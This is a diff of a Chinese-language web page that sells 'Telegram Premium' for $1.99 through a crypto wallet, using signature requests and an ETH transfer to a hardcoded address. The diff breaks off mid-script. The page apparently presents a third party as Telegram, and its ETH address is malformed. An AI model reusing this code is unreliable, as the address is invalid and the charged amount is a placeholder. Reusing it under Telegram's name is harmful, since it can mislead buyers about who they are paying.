@@ -1,331 +1,42 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no" />
     <title>Telegram Premium - 高级订阅服务</title>
-    <!-- 引入 Web3.js -->
-    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
-    <style>
-        /* 保持您原有的所有样式不变 */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-            -webkit-text-size-adjust: 100%;
-        }
-        
-        html {
-            font-size: 16px;
-        }
-        
-        @media (max-width: 480px) {
-            html { font-size: 14px; }
-        }
-        
-        @media (max-width: 360px) {
-            html { font-size: 13px; }
-        }
-        
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
-            color: white;
-            min-height: 100vh;
-            min-height: 100dvh;
-            padding: 1rem;
-            line-height: 1.5;
-            overflow-x: hidden;
-        }
-        
-        .container {
-            width: 100%;
-            max-width: 28rem;
-            margin: 0 auto;
-            padding: 0.5rem;
-        }
-        
-        .header {
-            text-align: center;
-            margin-bottom: 2rem;
-            padding: 0 0.5rem;
-        }
-        
-        .header h1 {
-            font-size: 1.8rem;
-            margin-bottom: 0.5rem;
-            background: linear-gradient(90deg, #ffd700, #ff8c00);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            font-weight: 700;
-        }
-        
-        .header p {
-            font-size: 0.95rem;
-            opacity: 0.9;
-        }
-        
-        .pricing-card {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            border-radius: 1.25rem;
-            padding: 1.5rem;
-            margin: 0 auto;
-            box-shadow: 0 0.5rem 2rem rgba(0, 0, 0, 0.2);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            text-align: center;
-        }
-        
-        .pricing-header h2 {
-            font-size: 1.4rem;
-            margin-bottom: 0.5rem;
-            color: #ffd700;
-            font-weight: 600;
-        }
-        
-        .price {
-            font-size: 2.5rem;
-            font-weight: bold;
-            margin: 1rem 0;
-            color: #ffd700;
-        }
-        
-        .price span {
-            font-size: 1rem;
-            color: rgba(255, 255, 255, 0.8);
-        }
-        
-        .description {
-            margin-bottom: 1.5rem;
-            font-size: 0.95rem;
-            opacity: 0.9;
-        }
-        
-        .btn {
-            display: inline-block;
-            background: linear-gradient(90deg, #ff8c00, #ffd700);
-            color: #1e3c72;
-            padding: 1rem 1.5rem;
-            border-radius: 3rem;
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 1.1rem;
-            transition: all 0.3s ease;
-            box-shadow: 0 0.25rem 1rem rgba(255, 140, 0, 0.4);
-            border: none;
-            cursor: pointer;
-            width: 100%;
-            margin-bottom: 1rem;
-            touch-action: manipulation;
-            min-height: 3.5rem;
-        }
-        
-        .btn:active {
-            transform: translateY(1px);
-            box-shadow: 0 0.125rem 0.5rem rgba(255, 140, 0, 0.4);
-        }
-        
-        .btn:disabled {
-            background: #666;
-            cursor: not-allowed;
-            opacity: 0.6;
-        }
-        
-        .form-container {
-            display: none;
-            margin-top: 1.5rem;
-            text-align: left;
-        }
-        
-        .form-group {
-            margin-bottom: 1.25rem;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 0.5rem;
-            font-weight: 500;
-            font-size: 0.95rem;
-        }
-        
-        input {
-            width: 100%;
-            padding: 1rem;
-            border-radius: 0.75rem;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            background: rgba(255, 255, 255, 0.1);
-            color: white;
-            font-size: 1rem;
-            min-height: 3.5rem;
-        }
-        
-        input:focus {
-            outline: none;
-            border-color: #ffd700;
-        }
-        
-        .wallet-container {
-            display: none;
-            margin-top: 1.5rem;
-            text-align: left;
-        }
-        
-        .wallet-options {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 0.75rem;
-            margin: 1rem 0 1.5rem 0;
-        }
-        
-        .wallet-option {
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 0.75rem;
-            padding: 1.25rem 0.5rem;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            border: 2px solid transparent;
-            min-height: 5rem;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .wallet-option:active {
-            background: rgba(255, 255, 255, 0.2);
-            border-color: #ffd700;
-            transform: scale(0.98);
-        }
-        
-        .wallet-icon {
-            font-size: 1.8rem;
-            margin-bottom: 0.5rem;
-        }
-        
-        .wallet-name {
-            font-weight: 600;
-            font-size: 0.85rem;
-            line-height: 1.2;
-        }
-        
-        .step {
-            display: flex;
-            align-items: flex-start;
-            margin-bottom: 1rem;
-        }
-        
-        .step-number {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 2rem;
-            height: 2rem;
-            background: #ffd700;
-            color: #1e3c72;
-            border-radius: 50%;
-            font-weight: bold;
-            margin-right: 0.75rem;
-            font-size: 0.9rem;
-            flex-shrink: 0;
-        }
-        
-        .step-text {
-            font-size: 0.95rem;
-            padding-top: 0.25rem;
-        }
-        
-        .features {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 0.75rem;
-            margin-top: 2rem;
-        }
-        
-        .feature {
-            background: rgba(255, 255, 255, 0.05);
-            padding: 1.25rem 0.5rem;
-            border-radius: 0.75rem;
-            text-align: center;
-        }
-        
-        .feature-icon {
-            font-size: 1.8rem;
-            margin-bottom: 0.75rem;
-            color: #ffd700;
-        }
-        
-        .feature h3 {
-            font-size: 0.9rem;
-            margin-bottom: 0.5rem;
-            font-weight: 600;
-            line-height: 1.2;
-        }
-        
-        .feature p {
-            font-size: 0.75rem;
-            opacity: 0.9;
-            line-height: 1.3;
-        }
-        
-        .instructions {
-            background: rgba(255, 215, 0, 0.2);
-            border: 1px solid #ffd700;
-            border-radius: 0.75rem;
-            padding: 1rem;
-            margin: 1rem 0;
-            font-size: 0.85rem;
-            text-align: center;
-            line-height: 1.4;
-        }
-        
-        .wallet-status {
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 0.75rem;
-            padding: 1rem;
-            margin: 1rem 0;
-            text-align: center;
-            font-size: 0.9rem;
-        }
-        
-        .wallet-status.connected {
-            background: rgba(0, 255, 0, 0.1);
-            border: 1px solid #00ff00;
-        }
-        
-        .wallet-status.error {
-            background: rgba(255, 0, 0, 0.1);
-            border: 1px solid #ff0000;
-        }
-        
-        @media (max-width: 320px) {
-            .wallet-options {
-                grid-template-columns: 1fr;
-                gap: 0.5rem;
-            }
-            
-            .features {
-                grid-template-columns: 1fr;
-                gap: 0.5rem;
-            }
-        }
 
-        .temporary-message {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(0, 0, 0, 0.9);
-            color: white;
-            padding: 1rem 2rem;
-            border-radius: 0.75rem;
-            z-index: 1000;
-            text-align: center;
-            max-width: 80%;
-            box-shadow: 0 0.5rem 2rem rgba(0, 0, 0, 0.3);
+    <!-- Web3.js -->
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+
+    <style>
+        /*（保留并略微调整原样式）*/
+        *{margin:0;padding:0;box-sizing:border-box}
+        html{font-size:16px}
+        @media (max-width:480px){html{font-size:14px}}
+        body{
+            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+            background:linear-gradient(135deg,#1e3c72 0%,#2a5298 100%);
+            color:#fff;min-height:100vh;padding:1rem;line-height:1.5;overflow-x:hidden;
         }
+        .container{width:100%;max-width:28rem;margin:0 auto;padding:0.5rem}
+        .header{text-align:center;margin-bottom:2rem}
+        .header h1{font-size:1.8rem;margin-bottom:0.5rem;background:linear-gradient(90deg,#ffd700,#ff8c00);-webkit-background-clip:text;background-clip:text;color:transparent;font-weight:700}
+        .pricing-card{background:rgba(255,255,255,0.08);backdrop-filter:blur(8px);border-radius:1.25rem;padding:1.5rem;margin:0 auto;box-shadow:0 0.5rem 2rem rgba(0,0,0,0.2);border:1px solid rgba(255,255,255,0.06);text-align:center}
+        .price{font-size:2.5rem;font-weight:700;margin:1rem 0;color:#ffd700}
+        .btn{display:inline-block;background:linear-gradient(90deg,#ff8c00,#ffd700);color:#1e3c72;padding:1rem 1.5rem;border-radius:3rem;text-decoration:none;font-weight:600;font-size:1.05rem;border:none;cursor:pointer;width:100%;margin-bottom:1rem}
+        .btn:disabled{background:#666;cursor:not-allowed;opacity:0.6}
+        .form-container{display:none;margin-top:1.5rem;text-align:left}
+        .form-group{margin-bottom:1.25rem}
+        label{display:block;margin-bottom:0.5rem;font-weight:500}
+        input{width:100%;padding:1rem;border-radius:0.75rem;border:1px solid rgba(255,255,255,0.16);background:rgba(255,255,255,0.04);color:#fff;font-size:1rem;min-height:3.5rem}
+        .wallet-container{display:none;margin-top:1.5rem;text-align:left}
+        .wallet-options{display:grid;grid-template-columns:repeat(2,1fr);gap:.75rem;margin:1rem 0 1.5rem 0}
+        .wallet-option{background:rgba(255,255,255,0.06);border-radius:.75rem;padding:1.25rem 0.5rem;text-align:center;cursor:pointer;border:2px solid transparent;min-height:5rem;display:flex;flex-direction:column;justify-content:center;align-items:center}
+        .wallet-status{background:rgba(255,255,255,0.06);border-radius:.75rem;padding:1rem;margin:1rem 0;text-align:center;font-size:.9rem}
+        .wallet-status.connected{background:rgba(0,255,0,0.06);border:1px solid rgba(0,255,0,0.18)}
+        .wallet-status.error{background:rgba(255,0,0,0.06);border:1px solid rgba(255,0,0,0.18)}
+        .temporary-message{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:rgba(0,0,0,0.9);color:#fff;padding:1rem 2rem;border-radius:.75rem;z-index:1000;text-align:center;max-width:80%}
+        .row{display:flex;gap:.5rem}
     </style>
 </head>
 <body>
@@ -334,358 +45,377 @@
             <h1>Telegram 高级订阅服务</h1>
             <p>使用您的加密货币钱包获取 Telegram Premium 订阅</p>
         </div>
-        
+
         <div class="pricing-card">
             <div class="pricing-header">
                 <h2>Telegram Premium</h2>
-                <div class="price">$1.99<span>/月</span></div>
-                <p class="description">为您自己或您的朋友和同事兑换享受专属功能和无限制体验</p>
+                <div class="price">$1.99<span style="font-size:1rem;color:rgba(255,255,255,0.85)"></span></div>
+                <p class="description">为您自己或好友兑换 Premium 权益</p>
             </div>
-            
+
             <button id="purchaseBtn" class="btn">立即购买</button>
-            
+
             <div id="userForm" class="form-container">
-                <div class="step">
-                    <div class="step-number">1</div>
-                    <div class="step-text">填写接收 Premium 订阅的 Telegram 用户信息</div>
-                </div>
-                
+                <div class="step"><div class="step-number">1</div><div class="step-text">填写接收 Premium 的 Telegram 用户信息</div></div>
+
                 <div class="form-group">
                     <label for="username">Telegram 用户名</label>
                     <input type="text" id="username" placeholder="例如: @username" required>
                 </div>
-                
                 <div class="form-group">
                     <label for="nickname">用户昵称</label>
                     <input type="text" id="nickname" placeholder="例如: 张三" required>
                 </div>
-                
-                <button id="confirmBtn" class="btn">确认支付 $1.99</button>
+
+                <button id="confirmBtn" class="btn">下一步 — 连接钱包</button>
             </div>
-            
+
             <div id="walletSection" class="wallet-container">
-                <div class="step">
-                    <div class="step-number">2</div>
-                    <div class="step-text">连接钱包并支付</div>
+                <div class="step"><div class="step-number">2</div><div class="step-text">选择并连接钱包（EVM / TRON 支持）</div></div>
+
+                <div id="walletStatus" class="wallet-status">检测钱包...</div>
+
+                <div style="margin:8px 0;font-size:0.9rem;opacity:0.95">
+                    <strong>网站域名：</strong><span id="siteDomain"></span>
                 </div>
-                
-                <div id="walletStatus" class="wallet-status">
-                    <div id="walletStatusText">正在检测钱包...</div>
+
+                <div class="row">
+                    <button id="connectWalletBtn" class="btn">连接钱包</button>
+                    <button id="preparePayBtn" class="btn" disabled>确认并预览交易</button>
                 </div>
-                
-                <div class="instructions">
-                    <strong>🔐 安全支付：</strong><br>
-                    连接钱包后，系统会显示完整交易详情<br>
-                    请在钱包中仔细核对并确认签名
-                </div>
-                
-                <button id="connectWalletBtn" class="btn">连接钱包</button>
-                <button id="payBtn" class="btn" disabled>支付 $1.99</button>
-                
+
                 <div class="wallet-options">
-                    <div class="wallet-option" onclick="selectWallet('MetaMask')">
-                        <div class="wallet-icon">🦊</div>
-                        <div class="wallet-name">MetaMask</div>
-                    </div>
-                    
-                    <div class="wallet-option" onclick="selectWallet('TrustWallet')">
-                        <div class="wallet-icon">🔒</div>
-                        <div class="wallet-name">Trust Wallet</div>
-                    </div>
-                    
-                    <div class="wallet-option" onclick="selectWallet('TokenPocket')">
-                        <div class="wallet-icon">🔷</div>
-                        <div class="wallet-name">TokenPocket</div>
-                    </div>
-                    
-                    <div class="wallet-option" onclick="selectWallet('TronLink')">
-                        <div class="wallet-icon">⚡</div>
-                        <div class="wallet-name">TronLink</div>
-                    </div>
-                    
-                    <div class="wallet-option" onclick="selectWallet('OKX')">
-                        <div class="wallet-icon">🆗</div>
-                        <div class="wallet-name">OKX Web3</div>
-                    </div>
-                    
-                    <div class="wallet-option" onclick="selectWallet('Bitget')">
-                        <div class="wallet-icon">💰</div>
-                        <div class="wallet-name">Bitget Wallet</div>
-                    </div>
-                    
-                    <div class="wallet-option" onclick="selectWallet('imToken')">
-                        <div class="wallet-icon">💳</div>
-                        <div class="wallet-name">imToken</div>
-                    </div>
-                    
-                    <div class="wallet-option" onclick="selectWallet('BitPie')">
-                        <div class="wallet-icon">🥧</div>
-                        <div class="wallet-name">BitPie比特派</div>
-                    </div>
+                    <div class="wallet-option" onclick="selectWallet('MetaMask')"><div class="wallet-icon">🦊</div><div class="wallet-name">MetaMask</div></div>
+                    <div class="wallet-option" onclick="selectWallet('TronLink')"><div class="wallet-icon">⚡</div><div class="wallet-name">TronLink</div></div>
+                    <div class="wallet-option" onclick="selectWallet('WalletConnect')"><div class="wallet-icon">🔗</div><div class="wallet-name">WalletConnect</div></div>
+                    <div class="wallet-option" onclick="selectWallet('Other')"><div class="wallet-icon">🔒</div><div class="wallet-name">其他</div></div>
                 </div>
             </div>
-        </div>
-        
-        <div class="features">
-            <div class="feature">
-                <div class="feature-icon">📁</div>
-                <h3>更大文件上传</h3>
-                <p>上传最大 4GB 的文件</p>
-            </div>
-            
-            <div class="feature">
-                <div class="feature-icon">🎥</div>
-                <h3>更快的下载速度</h3>
-                <p>享受无限制的下载速度</p>
-            </div>
-            
-            <div class="feature">
-                <div class="feature-icon">✈️</div>
-                <h3>专属贴纸</h3>
-                <p>使用 Premium 专属动画贴纸</p>
-            </div>
-            
-            <div class="feature">
-                <div class="feature-icon">👤</div>
-                <h3>高级聊天管理</h3>
-                <p>创建群组链接和更多管理工具</p>
-            </div>
+
         </div>
     </div>
 
     <script>
-        // Web3 实例和状态管理
-        let web3;
-        let userAddress;
-        let selectedWallet = '';
-        let orderData = {};
+    /**
+     * 改进要点实现：
+     * - Web3.js 初始化与兼容检测
+     * - 域名显示（window.location.hostname）
+     * - EIP-712 (eth_signTypedData_v4) 用于让钱包显示域名/来源（typedData 请求）
+     * - personal_sign + web3.eth.personal.ecRecover 做客户端可验证签名
+     * - 网络检查（支持 ETH 主网 / BSC / Polygon / TRON）
+     * - 交易预览通过 eth_sendTransaction 调用发起（钱包会弹窗显示完整 tx）
+     * - 事件监听 accountsChanged / chainChanged
+     * - 友好错误处理提示
+     */
 
-        // 显示临时消息函数
-        function showTemporaryMessage(message) {
-            const existingMessage = document.querySelector('.temporary-message');
-            if (existingMessage) {
-                existingMessage.remove();
-            }
-            
-            const messageDiv = document.createElement('div');
-            messageDiv.className = 'temporary-message';
-            messageDiv.textContent = message;
-            document.body.appendChild(messageDiv);
-            
-            setTimeout(() => {
-                if (messageDiv.parentNode) {
-                    messageDiv.remove();
-                }
-            }, 3000);
-        }
+    // === 配置项（请替换收款地址） ===
+    const RECEIVER_ADDRESS_ETH = '0x742EfB6A78A0b5c0e5c5F8c5B8c5c5F8c5B8c5c5F'; // 示例 ETH 地址（替换）
+    const RECEIVER_ADDRESS_TRON = 'TCSmW3PZTPaog8d2CKBstcFNcGGtyf9Jub'; // 示例 TRON 地址（替换）
+    const ACCEPTED_CHAIN_IDS = { 1: 'Ethereum Mainnet', 56: 'BSC Mainnet', 137: 'Polygon Mainnet' }; // 支持链
+    const PAYMENT_AMOUNT_ETH_WEI = null; // 可按需求动态设置（示例中按 ETH 值计算）
 
-        // 更新钱包状态显示
-        function updateWalletStatus(message, type = '') {
-            const statusElement = document.getElementById('walletStatus');
-            const statusText = document.getElementById('walletStatusText');
-            const connectBtn = document.getElementById('connectWalletBtn');
-            const payBtn = document.getElementById('payBtn');
-            
-            statusText.textContent = message;
-            statusElement.className = 'wallet-status ' + type;
-            
-            if (type === 'connected') {
-                connectBtn.style.display = 'none';
-                payBtn.disabled = false;
-            } else {
-                payBtn.disabled = true;
-            }
-        }
+    // 状态
+    let web3 = null;
+    let userAddress = null;
+    let selectedWallet = null;
+    let currentChainId = null;
+    let orderData = null;
 
-        // 选择钱包类型
-        function selectWallet(walletName) {
-            selectedWallet = walletName;
-            updateWalletStatus(`已选择: ${walletName}，点击"连接钱包"按钮继续`, '');
-            document.getElementById('connectWalletBtn').style.display = 'block';
-        }
+    // UI helpers
+    function showTemporaryMessage(text, timeout=3000) {
+        const ex = document.querySelector('.temporary-message');
+        if (ex) ex.remove();
+        const div = document.createElement('div'); div.className='temporary-message'; div.textContent=text;
+        document.body.appendChild(div);
+        setTimeout(()=>{ if (div.parentNode) div.remove(); }, timeout);
+    }
+    function updateWalletStatus(text, type='') {
+        const el = document.getElementById('walletStatus');
+        el.textContent = text;
+        el.className = 'wallet-status' + (type ? ' ' + type : '');
+    }
 
-        // 初始化 Web3
-        async function initWeb3() {
-            if (typeof window.ethereum !== 'undefined') {
-                try {
-                    web3 = new Web3(window.ethereum);
-                    
-                    // 监听账户变化
-                    window.ethereum.on('accountsChanged', (accounts) => {
-                        if (accounts.length === 0) {
-                            updateWalletStatus('钱包已断开连接', 'error');
-                        } else {
-                            userAddress = accounts[0];
-                            updateWalletStatus(`已连接: ${userAddress.substring(0, 8)}...`, 'connected');
-                        }
-                    });
-                    
-                    // 监听网络变化
-                    window.ethereum.on('chainChanged', (chainId) => {
-                        checkNetwork(parseInt(chainId));
-                    });
-                    
-                    return true;
-                } catch (error) {
-                    console.error('Web3 初始化失败:', error);
-                    return false;
-                }
-            } else {
-                updateWalletStatus('未检测到 Web3 钱包，请安装 MetaMask 或其他兼容钱包', 'error');
-                return false;
-            }
-        }
+    // 初始化页面显示 domain
+    document.getElementById('siteDomain').textContent = window.location.hostname;
 
-        // 检查网络
-        function checkNetwork(chainId) {
-            const supportedNetworks = [1, 56, 137]; // Ethereum, BSC, Polygon
-            if (!supportedNetworks.includes(chainId)) {
-                updateWalletStatus('请切换到支持的区块链网络 (ETH/BSC/Polygon)', 'error');
-                return false;
-            }
-            return true;
-        }
+    // 选择钱包类型（只是显示用途，实际使用window.ethereum或tronWeb）
+    function selectWallet(name) {
+        selectedWallet = name;
+        updateWalletStatus(`已选择: ${name}，请点击「连接钱包」按钮`, '');
+    }
+    window.selectWallet = selectWallet;
 
-        // 连接钱包
-        async function connectWallet() {
-            if (!selectedWallet) {
-                showTemporaryMessage('请先选择钱包类型');
-                return;
-            }
-
+    // 初始化 Web3：检测 window.ethereum / tronWeb
+    async function initWeb3() {
+        if (window.ethereum) {
             try {
-                // 请求账户访问
-                const accounts = await window.ethereum.request({ 
-                    method: 'eth_requestAccounts' 
+                web3 = new Web3(window.ethereum);
+                // 绑定事件
+                window.ethereum.on('accountsChanged', (accounts) => {
+                    if (!accounts || accounts.length === 0) {
+                        userAddress = null;
+                        updateWalletStatus('钱包已断开连接', 'error');
+                        document.getElementById('preparePayBtn').disabled = true;
+                    } else {
+                        userAddress = accounts[0];
+                        updateWalletStatus(`已连接: ${userAddress.substring(0,8)}...`, 'connected');
+                        document.getElementById('preparePayBtn').disabled = false;
+                    }
                 });
-                
+                window.ethereum.on('chainChanged', (chainIdHex) => {
+                    const chainId = parseInt(chainIdHex, 16);
+                    currentChainId = chainId;
+                    checkNetwork(chainId);
+                });
+                return true;
+            } catch (e) {
+                console.error('initWeb3 error', e);
+                updateWalletStatus('Web3 初始化失败: '+ (e.message||e), 'error');
+                return false;
+            }
+        } else if (window.tronWeb && window.tronWeb.ready) {
+            updateWalletStatus(`检测到 TronLink`, 'connected');
+            return true;
+        } else {
+            updateWalletStatus('未检测到 Web3 钱包，请安装 MetaMask/TronLink 或使用移动端 DApp 浏览器', 'error');
+            return false;
+        }
+    }
+
+    // 网络检查
+    function checkNetwork(chainId) {
+        if (!chainId) {
+            updateWalletStatus('无法检测链ID', 'error'); return false;
+        }
+        if (!Object.keys(ACCEPTED_CHAIN_IDS).map(x=>parseInt(x)).includes(chainId)) {
+            updateWalletStatus(`当前网络（ID:${chainId}）不受支持，请切换到 ETH/BSC/Polygon 等支持网络`, 'error');
+            return false;
+        }
+        updateWalletStatus(`当前网络：${ACCEPTED_CHAIN_IDS[chainId]}（ID:${chainId}）`, 'connected');
+        return true;
+    }
+
+    // 连接钱包
+    async function connectWallet() {
+        // 优先 EVM 钱包
+        if (window.ethereum) {
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 userAddress = accounts[0];
-                const chainId = await web3.eth.getChainId();
-                
-                // 验证网络
-                if (!checkNetwork(chainId)) {
-                    return;
+                web3 = new Web3(window.ethereum);
+                currentChainId = await web3.eth.getChainId();
+                if (!checkNetwork(currentChainId)) {
+                    // 不支持网络但仍连接，可提示用户切换
                 }
-                
-                // 显示连接成功
-                updateWalletStatus(
-                    `✅ ${selectedWallet} 已连接\n地址: ${userAddress.substring(0, 8)}...\n网络ID: ${chainId}`,
-                    'connected'
-                );
-                
+                updateWalletStatus(`✅ 已连接：${userAddress.substring(0,8)}...（ID:${currentChainId}）`, 'connected');
+                document.getElementById('preparePayBtn').disabled = false;
                 showTemporaryMessage('钱包连接成功！');
-                
-            } catch (error) {
-                console.error('连接钱包失败:', error);
-                if (error.code === 4001) {
-                    updateWalletStatus('用户拒绝了连接请求', 'error');
-                } else {
-                    updateWalletStatus('连接钱包失败: ' + error.message, 'error');
-                }
+                return;
+            } catch (err) {
+                console.error('connectWallet', err);
+                if (err.code===4001) updateWalletStatus('用户拒绝了连接请求', 'error');
+                else updateWalletStatus('连接失败: '+(err.message||err), 'error');
+                return;
             }
         }
 
-        // 处理支付
-        async function processPayment() {
-            if (!userAddress) {
-                showTemporaryMessage('请先连接钱包');
-                return;
-            }
+        // TronLink
+        if (window.tronWeb && window.tronWeb.ready) {
+            userAddress = window.tronWeb.defaultAddress.base58;
+            updateWalletStatus(`✅ 已连接 Tron: ${userAddress}`, 'connected');
+            document.getElementById('preparePayBtn').disabled = false;
+            return;
+        }
 
-            const username = document.getElementById('username').value.trim();
-            const nickname = document.getElementById('nickname').value.trim();
-            
-            if (!username || !nickname) {
-                showTemporaryMessage('请填写完整的用户信息');
-                return;
-            }
+        updateWalletStatus('未检测到支持的钱包', 'error');
+    }
 
-            // 生成订单数据
-            orderData = {
-                orderId: 'TG' + Date.now() + Math.random().toString(36).substr(2, 5).toUpperCase(),
-                username: username,
-                nickname: nickname,
-                amount: '1.99',
-                timestamp: Date.now()
+    // 生成订单数据
+    function makeOrder(username, nickname) {
+        return {
+            orderId: 'TG'+Date.now().toString(36).toUpperCase(),
+            username: username,
+            nickname: nickname,
+            amountUSD: '1.99',
+            timestamp: Date.now(),
+            site: window.location.hostname
+        };
+    }
+
+    // 主流程：准备并预览交易（先做签名验证，再调用钱包发起交易预览）
+    async function prepareAndPreviewPayment() {
+        if (!userAddress) { showTemporaryMessage('请先连接钱包'); return; }
+        const username = document.getElementById('username').value.trim();
+        const nickname = document.getElementById('nickname').value.trim();
+        if (!username || !nickname) { showTemporaryMessage('请填写完整信息'); return; }
+        if (!username.startsWith('@')) { showTemporaryMessage('用户名需以 @ 开头'); return; }
+
+        orderData = makeOrder(username, nickname);
+
+        try {
+            // 1) 请求用户对 EIP-712 typedData 进行签名（这个请求会在弹窗里展示 domain -> 通常钱包会显示来源域名）
+            // typedData v4 结构
+            const chainId = currentChainId || await web3.eth.getChainId();
+            const typedData = {
+                "types": {
+                    "EIP712Domain":[
+                        {"name":"name","type":"string"},
+                        {"name":"version","type":"string"},
+                        {"name":"chainId","type":"uint256"},
+                        {"name":"verifyingContract","type":"string"}
+                    ],
+                    "Order":[
+                        {"name":"orderId","type":"string"},
+                        {"name":"username","type":"string"},
+                        {"name":"nickname","type":"string"},
+                        {"name":"amountUSD","type":"string"},
+                        {"name":"timestamp","type":"uint256"}
+                    ]
+                },
+                "domain":{"name":"TelegramPremiumDApp","version":"1","chainId":chainId,"verifyingContract":window.location.hostname},
+                "primaryType":"Order",
+                "message": {
+                    orderId: orderData.orderId,
+                    username: orderData.username,
+                    nickname: orderData.nickname,
+                    amountUSD: orderData.amountUSD,
+                    timestamp: Math.floor(orderData.timestamp/1000)
+                }
             };
 
+            // 请求 EIP-712 签名（用于在钱包弹窗显示域名来源）
+            const from = userAddress;
+            let typedSig;
             try {
-                // 显示交易详情
-                const transactionDetails = {
-                    from: userAddress,
-                    to: '0x742EfB6A78A0b5c0e5c5F8c5B8c5c5F8c5B8c5c5F', // 替换为您的收款地址
-                    value: web3.utils.toWei('0.001', 'ether'), // 示例金额
-                    gas: '21000',
-                    data: web3.utils.asciiToHex(`Telegram Premium: ${username}`)
-                };
-
-                // 发送交易
-                const transactionHash = await window.ethereum.request({
-                    method: 'eth_sendTransaction',
-                    params: [transactionDetails],
+                typedSig = await window.ethereum.request({
+                    method: 'eth_signTypedData_v4',
+                    params: [from, JSON.stringify(typedData)]
                 });
-
-                showTemporaryMessage('交易已提交，等待确认...');
-
-                // 等待交易确认
-                const receipt = await web3.eth.getTransactionReceipt(transactionHash);
-                
-                if (receipt.status) {
-                    showTemporaryMessage('支付成功！Telegram Premium 已激活');
-                    // 这里可以调用后端API确认订单
-                    console.log('支付成功:', { orderData, transactionHash });
-                } else {
-                    throw new Error('交易失败');
-                }
-
-            } catch (error) {
-                console.error('支付失败:', error);
-                if (error.code === 4001) {
-                    showTemporaryMessage('用户取消了交易');
-                } else {
-                    showTemporaryMessage('支付失败: ' + error.message);
-                }
+            } catch (e) {
+                console.warn('用户可能拒绝 typedData 签名或钱包不支持 eth_signTypedData_v4', e);
+                // 我们不会强制失败，改为后续使用 personal_sign
             }
+
+            // 2) 为了能在客户端验证签名，我们同时请求 personal_sign（对一个 message hash），并使用 web3.eth.personal.ecRecover 验证
+            const payloadStr = JSON.stringify({
+                orderId: orderData.orderId,
+                username: orderData.username,
+                nickname: orderData.nickname,
+                amountUSD: orderData.amountUSD,
+                timestamp: orderData.timestamp,
+                site: window.location.hostname
+            });
+            const msgHash = web3.utils.sha3(payloadStr); // hex string
+            // 使用 personal_sign
+            let personalSig;
+            try {
+                personalSig = await window.ethereum.request({
+                    method: 'personal_sign',
+                    params: [msgHash, from]
+                });
+            } catch (e) {
+                console.error('personal_sign 被拒绝或失败', e);
+                showTemporaryMessage('请在钱包中确认签名以继续');
+                return;
+            }
+
+            // 验证签名（ecRecover）
+            let recovered;
+            try {
+                recovered = await web3.eth.personal.ecRecover(msgHash, personalSig);
+            } catch (e) {
+                console.error('ecRecover 失败', e);
+            }
+
+            if (!recovered || recovered.toLowerCase() !== from.toLowerCase()) {
+                showTemporaryMessage('签名校验失败，请重试或更换钱包', 4000);
+                return;
+            }
+
+            // 签名通过 —— 将签名存入 orderData（可发送给后端）
+            orderData.signature = personalSig;
+            orderData.typedSignature = typedSig || null;
+
+            // 3) 预览构建交易参数（发送交易前让用户在钱包里确认：钱包将显示 to/amount/data）
+            // 这里我们以 ETH 转账为例：把 USD 金额换成 ETH 可由前端或后端汇率服务计算。为示例，我们传入固定极小值
+            // IMPORTANT: 在真实环境，请替换为准确的金额换算逻辑
+            const txValueWei = web3.utils.toWei('0.001', 'ether'); // 示例：0.001 ETH (演示)
+            const txParams = {
+                from: from,
+                to: RECEIVER_ADDRESS_ETH,
+                value: web3.utils.toHex(txValueWei),
+                gas: web3.utils.toHex(21000),
+                data: web3.utils.toHex(`Telegram premium:${orderData.username}`)
+            };
+
+            // 4) 使用 eth_sendTransaction 发起钱包弹窗（用户在钱包中可查看完整交易详情并确认签名发到链上）
+            showTemporaryMessage('钱包将弹出交易预览，请在钱包中核对并确认');
+            const txHash = await window.ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [txParams]
+            });
+
+            // 显示提交成功提示；建议将 orderData 和 txHash 发送到后端保存
+            showTemporaryMessage('交易已提交：' + txHash, 5000);
+            console.log('订单生成', orderData, 'txHash', txHash);
+
+            // 跳转到 order 页面展示详情（可以携带 orderId & txHash & username）
+            const query = new URLSearchParams({
+                orderId: orderData.orderId,
+                username: encodeURIComponent(orderData.username),
+                nickname: encodeURIComponent(orderData.nickname),
+                txHash: txHash
+            });
+            setTimeout(()=>{ window.location.href = 'order.html?' + query.toString(); }, 1200);
+
+        } catch (err) {
+            console.error('prepareAndPreviewPayment error', err);
+            showTemporaryMessage('处理失败: ' + (err.message || err), 4000);
+        }
+    }
+
+    // DOM bindings
+    document.addEventListener('DOMContentLoaded', async () => {
+        await initWeb3();
+
+        document.getElementById('purchaseBtn').addEventListener('click', () => {
+            document.getElementById('userForm').style.display = 'block';
+            document.getElementById('purchaseBtn').style.display = 'none';
+        });
+
+        document.getElementById('confirmBtn').addEventListener('click', () => {
